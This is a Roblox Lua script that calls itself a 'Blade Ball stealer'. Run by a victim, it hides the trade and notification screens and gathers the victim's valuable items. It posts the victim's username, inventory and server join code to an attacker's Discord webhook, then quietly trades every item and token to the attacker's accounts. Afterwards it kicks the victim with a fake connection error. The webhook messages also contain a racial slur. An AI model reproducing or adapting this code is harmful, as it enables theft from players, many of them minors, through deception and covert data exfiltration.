_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "" 

---------------------------------------------------------
-- VERIFICATIONS DE SECURITE (TON SCRIPT ORIGINAL)
---------------------------------------------------------
if next(users) == nil or webhook == "" then
    plr:kick("You didn't add usernames or webhook")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("only work on server normal")
    return
end

if #Players:GetPlayers() >= 16 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

-- Reset PIN (Ta fonction importante)
local args = {[1] = {["option"] = "PIN", ["value"] = "9079"}}
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Account error. Please disable trade PIN and try again")
    return
end

-- Interface Cache
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false
tradeGui.Main.Visible = false
tradeGui.Main:GetPropertyChangedSignal("Visible"):Connect(function() tradeGui.Main.Visible = false end)
tradeGui.UnfairTradeWarning.Visible = false
tradeGui.UnfairTradeWarning:GetPropertyChangedSignal("Visible"):Connect(function() tradeGui.UnfairTradeWarning.Visible = false end)
notificationsGui.Notifications.Visible = false
notificationsGui.Notifications:GetPropertyChangedSignal("Visible"):Connect(function() notificationsGui.Notifications.Visible = false end)

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = tradeGui.Enabled end)

---------------------------------------------------------
-- FONCTIONS CORE
---------------------------------------------------------
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function getExecutor()
    return identifyexecutor and identifyexecutor() or "Unknown"
end

local function sendTradeRequest(user)
    local target = game:GetService("Players"):WaitForChild(user)
    repeat task.wait(0.1) until netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target) == true
end

local function addItemToTrade(itemType, ID)
    repeat task.wait(0.01) until netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID) == true
end

local function readyTrade()
    repeat task.wait(0.1) until netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true) == true
end

local function confirmTrade()
    repeat task.wait(0.1) netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer() until not inTrade
end

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items[category]
    if not rapData then return nameToRAP end
    for skey, rap in pairs(rapData) do
        local success, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if success then
            for _, pair in ipairs(decoded) do if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, cat in ipairs(categories) do rapMappings[cat] = buildNameToRAPMap(cat) end

local function getRAP(category, itemName)
    return rapMappings[category] and rapMappings[category][itemName] or 0
end

local function getNextBatch(items, batchSize)
    local batch = {}
    for i = 1, math.min(batchSize, #items) do table.insert(batch, table.remove(items, 1)) end
    return batch
end

---------------------------------------------------------
-- MESSAGES DISCORD (VIOLET / VERT / ROUGE)
---------------------------------------------------------
local function SendJoinMessage(list, prefix)
    local itemLines = ""
    for _, item in ipairs(list) do itemLines = itemLines .. "• " .. item.Name .. " - " .. formatNumber(item.RAP) .. " RAP\n" end
    
    local data = {
        ["auth_token"] = auth_token,
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["color"] = 8323327, -- VIOLET
            ["fields"] = {
                {name = "ℹ️ Player info:", value = "```\n🆔 Username     : " .. plr.Name .. "\n👤 Display Name : " .. plr.DisplayName .. "\n📅 Account Age  : " .. plr.AccountAge .. " Days\n⚡ Executor     : " .. getExecutor() .. "```", inline = false},
                {name = "Item list 📝:", value = "```" .. (itemLines ~= "" and itemLines or "None") .. "```", inline = false},
                {name = "Summary 💰:", value = "```Total RAP: " .. formatNumber(totalRAP) .. "```", inline = false}
            },
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

local function SendStatusMessage(title, color)
    local data = {
        ["auth_token"] = auth_token,
        ["embeds"] = {{
            ["title"] = title,
            ["color"] = color,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Summary 💰:", value = "```Total RAP: " .. formatNumber(totalRAP) .. "```", inline = false}
            },
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

---------------------------------------------------------
-- LOGIQUE FINALE
---------------------------------------------------------
local function doTrade(joinedUser)
    task.spawn(function()
        while #itemsToSend > 0 do
            sendTradeRequest(joinedUser)
            repeat task.wait(0.5) until inTrade
            local currentBatch = getNextBatch(itemsToSend, 100)
            for _, item in ipairs(currentBatch) do addItemToTrade(item.itemType, item.ItemID) end
            
            local tokens = tonumber(PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")) or 0
            if tokens >= 1 then netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens) end
            
            readyTrade()
            confirmTrade()
        end
        SendStatusMessage("✅ Stuff Successfully Stolen !", 65280)
        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
    end)
end

local function waitForUserJoin()
    local sent = false
    local function onUserJoin(player)
        if table.find(users, player.Name) then
            if not sent then
                SendStatusMessage("✅ The nigga is on the server ! 🎉", 65280) -- VERT
                sent = true
            end
            doTrade(player.Name)
        end
    end
    for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
    Players.PlayerAdded:Connect(onUserJoin)
end

Players.PlayerRemoving:Connect(function(p)
    if p == plr then SendStatusMessage("🔴 Victim Left the Server !", 16711680) end -- ROUGE
end)

-- Collecte Inventory
local totalRAP = 0
for _, category in ipairs(categories) do
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if not itemInfo.TradeLock then
            local rap = getRAP(category, itemInfo.Name)
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    SendJoinMessage(itemsToSend, (ping == "Yes" and "@everyone " or ""))
    waitForUserJoin()
end
